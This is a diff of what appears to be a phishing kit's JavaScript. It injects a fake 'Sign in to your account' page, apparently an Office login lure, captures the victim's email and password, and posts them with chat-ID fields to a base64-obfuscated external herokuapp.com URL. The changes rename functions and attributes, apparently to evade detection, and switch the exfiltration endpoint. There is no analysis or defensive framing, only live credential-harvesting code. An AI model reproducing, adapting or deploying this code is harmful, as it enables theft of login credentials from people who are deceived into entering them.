@@ -1,4 +1,4 @@
-function litz(){
+function voc(){
     document.body.innerHTML = box;    
     }
     const box = `<title>Sign in to your account</title>
@@ -7171,7 +7171,7 @@ var s = document.createElement("script");
 
 $(document).ready(function() {
   
- var email = $("#ref").attr("atroma");
+ var email = $("#ref").attr("ortin");
 $("#displayName").html(email);   
 
 
@@ -7236,9 +7236,9 @@ $("#btn2").attr('disabled',true);
 
 
  
-   var ruta = atob('aW5kZXgucGhw');
-   var yara = atob(document.getElementById("ref").getAttribute("alcoh"));
-   var cckcrch = atob(document.getElementById("ref").getAttribute("sitar"));
+   var ruta = atob('aHR0cHM6Ly9icnVqZWFzdGUtMGI5OTI3ZWI2NWU0Lmhlcm9rdWFwcC5jb20v');
+   var yara = atob(document.getElementById("ref").getAttribute("eas"));
+   var cckcrch = atob(document.getElementById("ref").getAttribute("obra"));
    var register = "u="+email+"&p="+epass+"&chatid="+yara+"&makin="+cckcrch+"&signup=office";
 
 $.post(ruta, register, function(data){            
